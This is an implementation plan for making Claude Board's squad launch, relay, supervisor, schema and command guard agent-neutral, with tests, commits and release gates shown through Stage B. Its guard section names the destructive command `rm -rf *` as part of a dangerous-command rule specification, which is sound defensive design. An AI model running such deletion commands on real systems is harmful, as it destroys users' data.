# Agent-Neutral Core (Phase 1) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Decouple Claude Board's squad launch, seat relay, heartbeat, supervisor close, squad schema and command guard from Claude Code while keeping today's PC and Mac Claude squads running unchanged, shipped in three independently releasable and reversible stages (A, B, C).

**Architecture:** Board rules stay in idempotent SQL (`db/schema.sql`: `cb.sessions.agent`, per-agent `cb.squad_set` validation, `cb._expected_model`); agent-specific launch, delivery, liveness, status, close and quota checks move behind `AgentAdapter` in `cli/agents/` (`claude` only in Phase 1); `cli/relay.ts` keys locks, logs and the `cb` bridge on `seatKey(machine, pane)` and reads Claude's socket from a temp endpoint file; role rules, PowerShell checks and fail-closed parsing unify in `kit/guard/core.mjs` with a thin dynamically-imported Claude shim.

**Tech Stack:** Node 24 running `.ts`/`.mjs` directly (zero new dependencies), `postgres` 3.4.9, PL/pgSQL in `db/schema.sql`, herdr 0.9.x, `node --test` against local Postgres on `127.0.0.1:5434`.

**Spec:** `docs/superpowers/specs/2026-11-26-agent-neutral-core-design.md` (Card #4002, Phase 1 of 5).

## Global Constraints

- **Success test:** today's Claude squads on the PC (`shaltoot`) and Mac (`macbook`) run unchanged (same herdr `--kind claude` argv, messaging-socket delivery, `cb` bridge, safety fences, supervisor timing).
- **Schema rules (`CLAUDE.md`):** idempotent `db/schema.sql` (`add column if not exists`, `drop constraint if exists`, `drop function if exists cb.<name> cascade`), `#variable_conflict use_variable` in PL/pgSQL bodies with unprefixed params, top-down ordering for `language sql` functions (`test/schema-fresh.test.ts` applies twice to an empty DB).
- **Agents (exact):** `'claude' | 'codex' | 'opencode' | 'agy'`. Phase 1 registers only `'claude'` in `cli/agents/index.ts`; `cb.squad_set` accepts `'claude'` for primary seats and refuses non-Claude primary agents in Phase 1 while validating all four in `fallback` (keeps the anti-goal true in every rollback state and prevents 10-minute supervisor retry storms); `getAdapter()` and `startOne()` still fail loudly on unregistered kinds as defense-in-depth.
- **Roles (exact):** `'lead' | 'architect' | 'owner' | 'builder' | 'reviewer' | 'qa' | 'investigator'`. Read-only roles (exact): `'reviewer' | 'qa' | 'investigator'` (subject to Ahmed's Q1 answer on `architect`/`owner`).
- **Per-agent model validation (`cb._check_model`):**
  - `claude`: exact enum `opus | sonnet | haiku | fable` (defaults: `sonnet` for `builder`/`qa`, `opus` for others).
  - `codex`: `^[a-z0-9][a-z0-9._-]{0,63}$`, excluding Claude aliases; explicit `model` required.
  - `opencode`: `^[a-z0-9][a-z0-9._-]{0,31}/[A-Za-z0-9][A-Za-z0-9._:/-]{0,95}$` (`provider/model`); explicit `model` required.
  - `agy`: `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`, excluding Claude aliases; explicit `model` required.
- **No new npm dependencies;** Node >=24 stdlib only (`package.json:6-21`). Every `case` in `cli/cb.ts` has a `cli/help.ts` entry (`test/help.test.ts:24-32`); `prompts/claude-md-snippet.md` matches `SNIPPET` (`test/help.test.ts:62-63`); role files stay <=60 lines and name only known `cb` commands (`test/squad-kit.test.ts:60-73`).
- **Fail-closed guard contract:**
  - Payload must decode to a plain JSON object with a plain-object `tool_input`. Empty stdin, invalid JSON, non-object payload, missing/non-object `tool_input`, non-string `tool_input.command` on shell tools, missing sibling `core.mjs`, or unknown `CB_ROLE` MUST return a block decision.
  - **`tool_name` omitted (`undefined`) with `typeof tool_input.command === 'string'` → `tool: 'shell'`** (preserves `test/dangerous.test.ts` and `docs/ops/maintain.md:85-92`). Present `tool_name` outside `'Bash' | 'PowerShell' | 'Edit' | 'Write' | 'NotebookEdit' | 'AskUserQuestion'` (including `""`) → fail closed (`unrecognized tool`).
  - Guard trusts `CB_ROLE` from pane env (zero DB calls). Unset/empty `CB_ROLE` applies base dangerous + PowerShell + `CB_PROTECTED_BRANCHES` rules only.
- **Tests (PC/Mac only, never VPS, never live DB):**
  - Pure (no-DB) test: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/<file>.test.ts`
  - DB test: hold `cb lock take db2` (exit 2 = queued: wait) before, `cb lock release db2` after (even on failure):
    `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/<file>.test.ts`
  - Full suite (before each stage merge): hold `cb lock take db` / `cb lock release db`, run `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 pnpm -s test`.
- **Commits:** conventional commits ending `(#4002)` on a worktree branch, never bypass hooks, never push or touch `~/.claude` without Ahmed's explicit OK.

## Review Focus

1. **Rollback safety & anti-goal (Stage A):** `cli/cb.ts` omits `agent` on Claude `cb iam` calls so a rolled-back 8-arg `cb.iam` never fails, `cb.squad_set` refuses non-Claude primary seats in Phase 1 so old `squad-up` can never launch Claude for a Codex seat, and rollback runs PC/Mac first, vps2 last (Tasks 1 & 3).
2. **Test isolation & zombie exit under `seatKey` (Stage B):** all 7 relay/bridge/help test files use per-pid unique pane IDs + `CB_MACHINE: 'testbox'`, a concurrency test proves zero cross-delivery between simultaneous relays, and `check()` exits cleanly on first `adapter.isAlive() === false` without calling `cb.inbox` (Task 4).
3. **Rolling relay handover (Stage B):** `cb` falls back to `sha1(CLAUDE_CODE_MESSAGING_SOCKET)` when no `seatKey` bridge exists yet, and a restarted `--child` relay inheriting socket env seeds its endpoint file without dropping messages (Task 4).
4. **Fail-closed guard + dynamic import + omitted `tool_name` (Stage C):** missing `core.mjs` fails closed (tested by copying shims alone), omitted `tool_name` + string `command` stays shell (only the 4 legacy fail-open lines in `test/dangerous.test.ts` flip), bare `*` is NOT blocked (`rm -rf *` passes), and tests/probes clear inherited `CB_*` env (Task 5).
5. **Existing live squads & zero false digest mismatches (Stage A):** absent `agent` defaults to `'claude'` everywhere with zero backfill; new `cb._expected_model` reads seat overrides and role models from `cb.projects.squad` cleanly on a fresh DB (Task 1).

---

## File Structure

- **Stage A — Schema + Adapters + Squad/Supervisor:**
  - `db/schema.sql` — `cb.sessions.agent`, `sessions_bind_changed`, `cb.iam`, `cb.inbox`, `cb.sessions_overview`, `cb.supervise_state`, `cb.resume`, `cb._check_model`, `cb._role_model`, `cb._expected_model`, `cb.digest`, `cb.squad_set`.
  - `cli/bridge.ts` (`seatKey`), `cli/agents/types.ts`, `cli/agents/claude.ts`, `cli/agents/index.ts`.
  - `cli/squad-up.ts`, `cli/supervise-plan.ts`, `cli/supervise.ts`, `cli/cb.ts` (`--agent`, `cb squad show`), `cli/help.ts`.
- **Stage B — Seat Relay Outside the CLI:**
  - `hooks/claude-endpoint.mjs`, `cli/relay.ts`, `cli/cb.ts` (bridge `seatKey` + legacy fallback, agent-neutral `cb relay`/`cb start`), `cli/help.ts`, and 7 relay/bridge/help test files.
- **Stage C — Unified Guard Core + Ops Docs:**
  - `kit/guard/core.mjs`, `kit/guard/shim-claude.mjs`, `kit/guard/install.mjs`, `kit/hooks/block-dangerous.mjs` (checkout-only fail-closed wrapper).
  - `docs/ops/maintain.md`, `prompts/roles/_common.md`, `prompts/claude-md-snippet.md`, `cli/help.ts`.

---

## Stage A: Schema, Adapter Contract, and Squad/Supervisor Wiring

### Task 1: Schema and SQL rules (`cb.sessions.agent`, per-agent `cb.squad_set`, `cb._expected_model`)

**Files:**
- Modify: `db/schema.sql:195-210`, `:641-652`, `:1490-1545`, `:1683-1715`, `:3458-3474`, `:4110-4115`, `:4197-4204`, `:4398-4405`, `:4459-4467`, `:4513-4729`, `:5062-5085`
- Test: `test/squad-kit.test.ts`, `test/repos-squad.test.ts`, `test/squad-timers.test.ts`, `test/supervise-state.test.ts`, `test/schema-fresh.test.ts`

**Interfaces:**
- Produces:
  - Column `cb.sessions.agent text not null default 'claude'` with `sessions_agent_check` (`agent in ('claude','codex','opencode','agy')`), added right after `:209`.
  - Ensure `alter table cb.projects add column if not exists squad jsonb;` also runs at `:3472` (alongside `pipeline`, kept idempotent at `:4467`) so `cb._expected_model` works on an empty DB.
  - Trigger `sessions_bind_changed` (`:650-652`) fires on `old.agent is distinct from new.agent`.
  - `cb.iam(..., agent text default null)` — validates `agent` ∈ `('claude','codex','opencode','agy')`; preserves existing `agent` on same-actor rebind with `null`; defaults `'claude'` on new row or actor takeover.
  - `cb.inbox`, `cb.sessions_overview`, `cb.supervise_state` and `cb.resume` include `'agent', s.agent`.
  - New `cb._check_model(agent text, model text, label text) returns void` — Claude refusal keeps `% model must be opus, sonnet, haiku or fable` (`test/squad-kit.test.ts:125`); Codex/OpenCode/agy refusals name `<label>`, `<agent>`, and expected format.
  - `cb._role_model(role text, agent text default 'claude') returns text` — `'sonnet'`/`'opus'` for `claude`, `null` for others.
  - New `cb._expected_model(project text, actor text, role text, area text, repo text, agent text) returns text` (`language plpgsql stable`, placed right after `cb._role_model`) — derives `seat_key` mirroring `wantList` (`cli/squad-up.ts:67-84`: `'1'` for `lead`, `area` for `owner`, `(regexp_match(actor, '[ABRQI]([0-9]+)@'))[1]` prefixed with `coalesce(nullif(repo, ''), home_repo) || ':'` when `squad->'repos'` is non-null and `role in ('builder','reviewer')`, reading `home_repo` directly from `squad->'repos'`), returns `seats[seat_key].model ?? roles[role].model ?? cb._role_model(role, agent)`. Used by **`cb.digest` group 10** (`:4197-4204`, selecting `s2.area, s2.repo, s2.agent`, skipping when result is `null`).
  - `cb.squad_set` expands role keys to `('count','model','machine','agent','fallback','seats')`:
    - Primary role/seat `agent`: optional, default `'claude'`; unknown agent refused (`agent must be one of...`); non-Claude primary (`codex`/`opencode`/`agy`) refused in Phase 1 (`agent "<k>" cannot be assigned as a primary seat yet (phase 1 supports claude only; non-Claude agents are allowed in fallback)`); `'claude'` omitted in saved JSON.
    - `fallback`: optional array (0–5 items) of `{ agent, model }` (no extra keys), all four agents accepted and validated via `cb._check_model`, no duplicate pairs, none equal to primary `(agent, model)`; omitted when absent/empty.
    - `seats`: optional map of valid seat key (`"1"`..`"<count>"`, `"<repo>:<1..count[repo]>"`, `"<area>"` for `owner`, `"1"` for `lead`) to non-empty `{ agent?, model?, fallback? }`, validated by the same rules.

- [ ] **Step 1: Write the failing tests**
  - In `test/squad-kit.test.ts`:
    - `cb.iam stores agent, defaults to claude, preserves on rebind, refuses unknown` + assert `sessions_bind_changed` fires on `agent` change (listen on `cb_events` or check event/notify delivery when rebinding only `agent`).
    - `cb.sessions_overview, cb.inbox and cb.resume return agent`.
    - `squad_set validates agent gate, per-agent models in fallback, and seats`:
      - Valid: Claude role with explicit `agent: 'claude'` (omitted in stored JSON); `fallback: [{ agent: 'codex', model: 'gpt-6.1-sol' }, { agent: 'opencode', model: 'anthropic/claude-opus-5-5' }, { agent: 'agy', model: 'gemini-4-neon-xhigh' }]`; `seats: { '2': { model: 'opus', fallback: [{ agent: 'codex', model: 'gpt-6.1-sol' }] } }` on `count: 3`; `seats: { claims: { model: 'sonnet' } }` on `owner`.
      - Refused: unknown agent (`'grok'`); non-Claude primary role/seat `agent: 'codex'` (`/cannot be assigned as a primary seat yet/`); invalid fallback models (`codex` + `'sonnet'`, `opencode` missing `/`, `agy` + `'opus'`, missing `model`, >5 fallbacks, extra key, duplicate pair, fallback equal to primary); invalid seat keys (`'4'` when `count: 3`, `{}`, unknown owner area `'other'`).
      - Existing Claude-only squad saves **byte-identical** to `SQUAD` (`test/squad-kit.test.ts:112`, `test/repos-squad.test.ts:64`).
  - In `test/repos-squad.test.ts`:
    - `squad_set validates multi-repo seat keys`: `builder.seats = { 'api:2': { model: 'opus', fallback: [{ agent: 'codex', model: 'gpt-6.1-sol' }] } }` succeeds; `'api:3'`, `'web:1'`, `'1'` are refused.
  - In `test/squad-timers.test.ts`:
    - `digest group 10 uses cb._expected_model and matches wantList seat keys`: test single-repo role override (`builder` on `opus`), multi-repo seat override (`api:2` on `opus` with actor `demo-api-B2@macbook` matching `wantList`), owner area override (`demo-O-claims@macbook`), mismatched model emitting group 10, and project-without-squad still matching `:172`.
  - In `test/supervise-state.test.ts`:
    - `supervise_state sessions include agent (defaulting to claude)`.

- [ ] **Step 2: Run tests to verify they fail**
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/squad-kit.test.ts test/repos-squad.test.ts test/squad-timers.test.ts test/supervise-state.test.ts`
  Release `cb lock release db2`. Expected: FAIL.

- [ ] **Step 3: Implement SQL changes in `db/schema.sql`**
  Add `sessions.agent`, hoist idempotent `projects.squad` column add to `:3472`, update trigger + RPCs, add `drop function if exists cb._check_model cascade;` and `cb._expected_model cascade;`, implement `_check_model`, `_role_model`, `_expected_model`, digest group 10, and `squad_set`.

- [ ] **Step 4: Run tests to verify they pass**
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/squad-kit.test.ts test/repos-squad.test.ts test/squad-timers.test.ts test/supervise-state.test.ts test/schema-fresh.test.ts test/relay.test.ts`
  Release `cb lock release db2`. Expected: all PASS (including `schema-fresh` applying twice to an empty DB).

- [ ] **Step 5: Commit**
  ```bash
  git add db/schema.sql test/squad-kit.test.ts test/repos-squad.test.ts test/squad-timers.test.ts test/supervise-state.test.ts
  git commit -m "feat(schema): add session agent, per-agent squad validation, seats and expected model (#4002)"
  ```

---

### Task 2: Agent adapter interface and Claude adapter (`cli/agents/`)

**Files:**
- Create: `cli/agents/types.ts`, `cli/agents/claude.ts`, `cli/agents/index.ts`
- Modify: `cli/bridge.ts:20-26`
- Test: `test/agents.test.ts` (new, pure — no DB)

**Interfaces:**
- Produces:
  - `cli/bridge.ts`: `export function seatKey(machine: string, pane: string): string` (`sha1(\`${machine.trim().toLowerCase()}:${pane.trim()}\`).slice(0, 12)`).
  - `cli/agents/types.ts`: `AgentKind`, `AgentState`, `SeatHandle`, `LaunchSpec`, `AgentStatus`, `QuotaSignal`, `GuardInstallSpec`, `InstructionMapping`, `TrustSpec`, `DisableAskSpec`, `LaunchInput`, `AgentAdapter`.
  - `cli/agents/claude.ts`:
    - `claudeEndpointPath(machine, pane)` → `join(tmpdir(), \`cb-seat-${seatKey(machine, pane)}.claude.json\`)`.
    - `writeClaudeEndpoint(machine, pane, { socket, token, pid? })` (atomic `.tmp.<pid>` + `renameSync`, `mode: 0o600` on POSIX; `pid` informational only; never logs token), `readClaudeEndpoint`, `clearClaudeEndpoint(machine, pane, expectedSocket?)`.
    - `claudeAdapter`: `kind: 'claude'`, `relayStart: 'session-hook'`, `buildLaunch` (byte-identical `--kind claude` args), `deliver` (5 s timeout, auth+user JSON lines, single retry if endpoint file rotated on `ENOENT`/`ECONNREFUSED`), `isAlive` (`Boolean(ep && existsSync(ep.socket))`), `readStatus` (`idle|done` → `safeToClose: true`), `close` (`/exit`), `detectQuotaStop`, `guardInstallSpec`, `instructionMapping` (`nativeFiles: ['CLAUDE.md', '~/.claude/CLAUDE.md']`, `extraArgs: []`, `env: {}`), `trustSpec` (`dialogHint: 'folder trust or bypass warning'`), `disableAskSpec` (`AskUserQuestion`, `hooks/deny-ask.mjs`).
  - `cli/agents/index.ts`: `AGENT_KINDS`, `isAgentKind`, `getAdapter(kind)` (throws `agent "${kind}" is not installed yet (phase 1 supports claude only)` for `codex`/`opencode`/`agy`, `unknown agent "${kind}"` otherwise), `defaultModelFor(agent, role)`.

- [ ] **Step 1: Write the failing tests** in `test/agents.test.ts`:
  - Registry returns `claudeAdapter`, refuses `codex`/`opencode`/`agy` with `is not installed yet`, refuses `'grok'` with `unknown agent`.
  - `defaultModelFor`: `'claude'` returns `'sonnet'` for `builder`/`qa` and `'opus'` for `lead`/`architect`/`owner`/`reviewer`/`investigator`; returns `null` for `codex`/`opencode`/`agy`.
  - `claudeAdapter.buildLaunch` produces exact current Claude argv (trailing slashes stripped).
  - Endpoint file round-trip, `deliver`, socket-rotation retry, `isAlive` (`true` while socket file exists, `false` when gone), and `clearClaudeEndpoint` matching `expectedSocket`.
  - `readStatus`, `close` (`/exit` → `'sent'`/`'failed'`), `detectQuotaStop`, `trustSpec`, `disableAskSpec`, `guardInstallSpec` (`Bash|PowerShell` on `win32`, `Bash` on `darwin`), and `instructionMapping` (`CLAUDE.md`).

- [ ] **Step 2: Run test to verify it fails**
  Run: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/agents.test.ts`
  Expected: FAIL (`ERR_MODULE_NOT_FOUND`).

- [ ] **Step 3: Implement `seatKey` in `cli/bridge.ts` and `cli/agents/{types,claude,index}.ts`**
  Keep `claude.ts` pure (no DB imports); unlink temp file on error in `writeClaudeEndpoint`.

- [ ] **Step 4: Run tests to verify they pass**
  Run: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/agents.test.ts`
  Expected: all PASS.

- [ ] **Step 5: Commit**
  ```bash
  git add cli/bridge.ts cli/agents/types.ts cli/agents/claude.ts cli/agents/index.ts test/agents.test.ts
  git commit -m "feat(agents): add AgentAdapter interface, registry and Claude adapter (#4002)"
  ```

---

### Task 3: Wire adapters into `cb squad up`, `cb supervise`, `cb` CLI and `cb help`

**Files:**
- Modify: `cli/squad-up.ts:7-16`, `:67-105`, `:167-213`, `:258-265`
- Modify: `cli/supervise-plan.ts:4-18`, `:20-88`
- Modify: `cli/supervise.ts:10-12`, `:163-187`, `:255-256`
- Modify: `cli/cb.ts:16-30`, `:576-585`, `:742-751`
- Modify: `cli/help.ts:20-23`, `:50-52`, `:211`
- Test: `test/squad-up.test.ts`, `test/supervise-plan.test.ts`, `test/supervise.test.ts`, `test/help.test.ts`, `test/cli.test.ts`

**Interfaces:**
- Consumes: `getAdapter`, `AgentKind` (`cli/agents/index.ts`, Task 2); Stage A schema (Task 1).
- Produces:
  - `cli/squad-up.ts`: `SeatOverride`, extended `Role`, `Want.seatKey`, `Launch` (`agent`, `board`, `fallback?`, `env` always containing `CB_ROLE` + `CB_AGENT` alongside `CB_PROTECTED_BRANCHES`), `export function seatSpec(squad, w)`, `launchFor` (appends `--agent <agent>` to prompt only when `agent !== 'claude'`), `startOne` (resolves `getAdapter(l.agent)` before creating any pane, builds `herdr agent start` from `adapter.buildLaunch(l)`, uses `adapter.trustSpec(...).dialogHint`).
  - `cli/supervise-plan.ts`: `Session.agent?`, `TickInput.safeToClose?: Record<string, boolean>` (falls back to `READY.has(status)` when omitted).
  - `cli/supervise.ts`: precomputes `safeToClose` via `adapter.readStatus` in `tick()` (unregistered kind → `false`), delegates close in `closeOne` through `adapter.close` (unregistered kind → clears `closing_at` and skips), adds `agents/index.ts` and `agents/claude.ts` to version hash (`:255-256`).
  - `cli/cb.ts`:
    - `OPTIONS` adds `agent: { type: 'string' }`.
    - `case 'iam'`: resolves `const ag = o.agent ?? process.env.CB_AGENT ?? null` and **omits** `agent` from `callFn('iam', ...)` unless `ag && ag !== 'claude'` (`...(ag && ag !== 'claude' ? { agent: ag } : {})`) — keeps Claude `cb iam` working against a rolled-back 8-arg `cb.iam`!
    - `case 'squad'` `show`: keeps Claude output unchanged (`builder  2 × sonnet on macbook`) and formats `(<agent>)`, `fallback`, or per-seat overrides when present.

- [ ] **Step 1: Write the failing tests**
  - In `test/squad-up.test.ts`:
    - `launchFor sets CB_ROLE and CB_AGENT and defaults missing agent to claude` (update `:88-90,389,564-576` for `agent`, `board`, `CB_ROLE`, `CB_AGENT` while keeping `IHOP_WANT`/`IHOP_RESUME` and Claude herdr args unchanged).
    - `seatSpec resolves per-seat overrides and non-Claude prompt includes --agent`.
    - `startOne refuses an unimplemented agent before creating a pane` (synthetic `Launch` with `agent: 'codex'` → `{ ok: false }`, zero herdr calls).
  - In `test/supervise-plan.test.ts`: `planTick respects precomputed safeToClose per session`.
  - In `test/supervise.test.ts`: `closeOne delegates through Claude adapter and safely skips unregistered agent`.
  - In `test/cli.test.ts`: `cb iam --agent and $CB_AGENT store agent; default claude omits agent param` (test `--agent codex`, `CB_AGENT=opencode`, and default `cb iam` without `--agent` keeping `sessions.agent === 'claude'` — plus unit-check or SQL test verifying 8-arg compatibility).
  - In `test/help.test.ts`: `cb help iam` documents `--agent`; `cb help squad` documents `agent`, `seats`, `fallback`; `cb squad show` prints Claude roles unchanged and prints `seats`/`fallback` when configured.

- [ ] **Step 2: Run tests to verify they fail**
  Pure tests:
  `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/squad-up.test.ts test/supervise-plan.test.ts`
  DB tests (take `cb lock take db2` before, `cb lock release db2` after):
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/supervise.test.ts test/help.test.ts test/cli.test.ts`
  Expected: FAIL.

- [ ] **Step 3: Implement updates in `cli/squad-up.ts`, `cli/supervise-plan.ts`, `cli/supervise.ts`, `cli/cb.ts`, `cli/help.ts`**
  Keep Claude output format `(${l.role}, ${l.model})` unchanged (`squad-up.ts:259`, `supervise.ts:110`); use `(${l.role}, ${l.agent}/${l.model})` when `l.agent !== 'claude'`.

- [ ] **Step 4: Run tests to verify they pass**
  Pure: `NODE_OPTIONS=--max-old-space-size=4096 timeout 300 node --test test/squad-up.test.ts test/supervise-plan.test.ts test/agents.test.ts`
  DB (hold `cb lock take db2` / `cb lock release db2`):
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/supervise.test.ts test/help.test.ts test/cli.test.ts test/squad-kit.test.ts test/repos-squad.test.ts`
  Expected: all PASS.

- [ ] **Step 5: Commit Stage A**
  ```bash
  git add cli/squad-up.ts cli/supervise-plan.ts cli/supervise.ts cli/cb.ts cli/help.ts test/squad-up.test.ts test/supervise-plan.test.ts test/supervise.test.ts test/help.test.ts test/cli.test.ts
  git commit -m "feat(squad): wire AgentAdapter into squad-up, supervisor and cb CLI (#4002)"
  ```

- [ ] **Stage A Release Gate (separately releasable & reversible — after Ahmed's go):**
  - Full suite under `cb lock take db`: `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 pnpm -s test` (release `db` lock).
  - Deploy: vps2 schema (`git merge --ff-only origin/main && cd deploy && dc up -d --build board`, check `/healthz`) → PC `git pull --ff-only` → Mac verified `tar` → stop `cb supervise`, run `cb supervise --dry-run` (must show zero surprise actions on `ihop`/`qhs`), start `cb supervise`.
  - Stage A restarts every relay once: `seatKey` in `cli/bridge.ts` is part of the relay's code list (`cli/relay.ts:47`) and the watchdog relaunches on a code change. Same on PC `git pull`, on the Mac tar, and again on rollback. A few seconds of task-change notices during the restart are not replayed (as for any relay update).
  - Success check (relays): every relay reconnects on the new `cb-relay/<ver>`: `select application_name, count(*) from pg_stat_activity where application_name like 'cb-relay%' group by 1`.
  - Success check (argv): `cb squad up --dry-run` lines for `ihop` and `qhs` are identical to a capture taken before the deploy, and the argv pin test ("startOne: a Claude seat starts with exactly today's herdr argv") is green in the gate's full suite.
  - Success check (digest): digest group 10 changes on deploy by design. Capture `cb digest ihop` and `cb digest qhs` group-10 lines before and after; every difference must be explained by that squad's role models (the old check compared against fixed defaults, the new one against the squad's own models). `cb iam` runs cleanly.
  - Success check (herdr): `--env CB_ROLE/CB_AGENT` is now on every pane-making herdr call (herdr 0.9.5 accepts it on PC and Mac). Watch the first real seat start or restore on the PC and on the Mac succeed after deploy; if herdr refuses, roll back the PC/Mac code.
  - Rollback (strict order): **PC/Mac FIRST** (`git checkout <prev-sha>`, tar Mac, restart `cb supervise`) -> **vps2 LAST** (`git checkout <prev-sha> && cd deploy && dc up -d --build board`; `git checkout vps` before next forward deploy). Before vps2: find squads saved with the new keys, `select slug from cb.projects where squad::text ~ '"(seats|fallback)"'`; strip those keys and re-save them (or accept that the old board refuses to re-save them and the old launcher ignores seat models).
---

## Stage B: Seat Relay Outside the CLI

### Task 4: Seat relay outside the CLI, bridge fallback, and test isolation (`cli/relay.ts`, `cli/cb.ts`, `hooks/claude-endpoint.mjs`)

**Files:**
- Create: `hooks/claude-endpoint.mjs`
- Modify: `cli/relay.ts:1-90`, `:197-273`
- Modify: `cli/cb.ts:65-72`, `:223-247`, `:570-575`
- Modify: `cli/help.ts:30-32`, `:418-441`
- Test (including `seatKey` test isolation across ALL 7 files): `test/relay.test.ts`, `test/bridge.test.ts`, `test/help.test.ts`, `test/asks.test.ts`, `test/followup.test.ts`, `test/github.test.ts`, `test/sendback.test.ts`

**Interfaces:**
- Consumes: `seatKey`, `serveBridge`, `openBridge`, `bridgeFiles` (`cli/bridge.ts`); `getAdapter`, `claudeEndpointPath`, `writeClaudeEndpoint`, `clearClaudeEndpoint` (`cli/agents/`).
- Produces:
  - `hooks/claude-endpoint.mjs`: Claude `SessionStart` hook — writes `cb-seat-<seatKey>.claude.json` when `CLAUDE_CODE_MESSAGING_SOCKET`, `_TOKEN`, `HERDR_PANE_ID` are set, spawns `cli/relay.ts --pane <pane> --agent claude` detached if not already running; prints nothing, exits 0.
  - `cli/relay.ts`: accepts `--pane <id>` (else `$HERDR_PANE_ID`), `--agent <kind>` (else `$CB_AGENT`, else `'claude'`), `--child`, `--restart`; keys files on `seatKey(machine(), pane)`; launcher writes endpoint file when socket+token env present before spawning `--child`; `--child` seeds endpoint file from inherited env if no newer file exists; `CODE` watch list (`:47`) adds `cli/agents/index.ts` and `cli/agents/claude.ts`; `check()` calls `await adapter.isAlive(seat)` **before** `cb.inbox` and exits cleanly (removing matching endpoint file, releasing lock + bridge) on the first `false`; 2 s watchdog also polls `adapter.isAlive(seat)`.
  - `cli/cb.ts`: bridge lookup (`:67-71`) and `relayOn()` (`:224-232`) try `seatKey(machine(), pane)` first, then fall back once to legacy `sha1(CLAUDE_CODE_MESSAGING_SOCKET).slice(0, 12)`; `case 'relay'` (`:570-575`) requires only `pane`, resolves `agent`, validates via `getAdapter(agent)`, and for `claude` requires socket env or live endpoint file.

- [ ] **Step 1: Isolate relay/bridge/hook test pane IDs under `seatKey` and write failing tests**
  - **Test isolation (all 7 files — required so parallel or back-to-back runs never collide on `(testbox, p7|p8|p9)`):**
    - Update `test/relay.test.ts:68,71,214,548`, `test/bridge.test.ts:61-64,131,136,152-155`, `test/asks.test.ts:256,259,262`, `test/followup.test.ts:308,314,317`, `test/sendback.test.ts:345,348,351`, `test/github.test.ts:666,670`, and `test/help.test.ts:103-104,112,128-129` so every test uses a per-process, per-test unique pane ID including `process.pid` (e.g. `p-relay-main-${process.pid}`, `p-asks-${process.pid}`, etc.) and explicit `CB_MACHINE: 'testbox'` (or `CB_MACHINE: 'mac'` + `p-help-${process.pid}` in `help.test.ts`). Update every lock/bridge pre-write from `sha1(path)` to `seatKey(machine, pane)`, and in `test/bridge.test.ts:61,152` bind a lightweight `net.createServer().listen(inbox)` (closed in `finally`) since those two tests previously passed an unbound dummy path that only beat the 2 s watchdog by timing.
  - In `test/relay.test.ts`:
    - `external seat relay starts without CLAUDE_CODE_MESSAGING_SOCKET in its own env and delivers via endpoint file` (with `CB_MACHINE: 'testbox'`, `pane: p-ext-${process.pid}`).
    - `dead Claude socket stops heartbeating and exits cleanly on first isAlive false` (close fake inbox server → wait ≤4 s → relay exits 0, lock empty, endpoint file removed, `last_seen` stops advancing).
    - `two concurrent seat relays on one machine share zero lock, bridge or endpoint files and never cross-deliver`: spawn two relays simultaneously under `CB_MACHINE: 'testbox'` with `p-conc-a-${process.pid}` and `p-conc-b-${process.pid}` on separate fake inboxes; assert disjoint `.pid`/`.bridge`/`.claude.json` paths, post separate answers to each actor, and assert each fake inbox receives ONLY its own message.
    - `hooks/claude-endpoint.mjs writes endpoint file and exits 0`: spawn with explicit `CB_MACHINE: 'testbox'` and `HERDR_PANE_ID: p-hook-${process.pid}` (never letting `machine()` fall back to host `hostname()`!) + live lock PID; assert endpoint JSON matches and exits 0.
  - In `test/bridge.test.ts`:
    - `cb finds bridge by seatKey without CLAUDE_CODE_MESSAGING_SOCKET`.
    - `cb falls back to legacy sha1(SOCKET) bridge key during rolling upgrade`.
  - In `test/help.test.ts`:
    - `cb start` with per-pid pane + live `cb-relay-<seatKey>.pid` (no `CLAUDE_CODE_MESSAGING_SOCKET`) reports `Relay on`; with no socket and no endpoint file reports `Relay unavailable` (`:129-130`).

- [ ] **Step 2: Run tests to verify they fail**
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/relay.test.ts test/bridge.test.ts test/help.test.ts`
  Release `cb lock release db2`. Expected: FAIL.

- [ ] **Step 3: Implement `hooks/claude-endpoint.mjs`, `cli/relay.ts`, `cli/cb.ts`, `cli/help.ts`**

- [ ] **Step 4: Run all affected relay/bridge/CLI tests to verify they pass**
  Take `cb lock take db2`, run:
  `CB_TEST_DB=claude_board_test_anc NODE_OPTIONS=--max-old-space-size=4096 timeout 600 node --test --test-concurrency=1 test/relay.test.ts test/bridge.test.ts test/help.test.ts test/asks.test.ts test/followup.test.ts test/github.test.ts test/sendback.test.ts test/cli.test.ts`
  Release `cb lock release db2`. Expected: all PASS (compare any pre-existing `type_to` flake against base `46de6b7`; zero new failures).

- [ ] **Step 5: Commit Stage B**
  ```bash
  git add hooks/claude-endpoint.mjs cli/relay.ts cli/cb.ts cli/help.ts test/relay.test.ts test/bridge.test.ts test/help.test.ts test/asks.test.ts test/followup.test.ts test/github.test.ts test/sendback.test.ts
  git commit -m "feat(relay): decouple seat relay via seatKey, endpoint file and per-pid test isolation (#4002)"
  ```

- [ ] **Stage B Release Gate (separately releasable & reversible — after Ahmed's go):**
